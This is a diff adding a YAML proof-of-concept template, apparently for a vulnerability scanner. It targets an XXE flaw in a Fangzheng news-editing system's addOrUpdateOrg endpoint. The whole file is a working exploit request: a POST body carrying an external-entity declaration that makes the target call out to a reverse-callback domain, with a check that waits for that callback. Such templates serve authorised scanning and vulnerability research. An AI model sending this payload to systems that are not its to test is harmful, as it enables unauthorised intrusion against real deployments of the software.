@@ -1,0 +1,27 @@
+name: poc-yaml-fangzheng-addOrUpdateOrg-XXE
+transport: http
+
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /newsedit/api/orgUser/addOrUpdateOrg
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+       xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://{{reverseDomain}}%22%3E%20%25remote;%5D%3E
+    expression: reverse.wait(1)
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488027&idx=1&sn=6962fe1d776466e04ac4652b8ee38c1c&chksm=c267a728f5102e3eb48f4fa820dccf89d3d4333c03153a41428b998f728299d66309dbbdd4ab&token=48786214&lang=zh_CN#rd
+
+
+
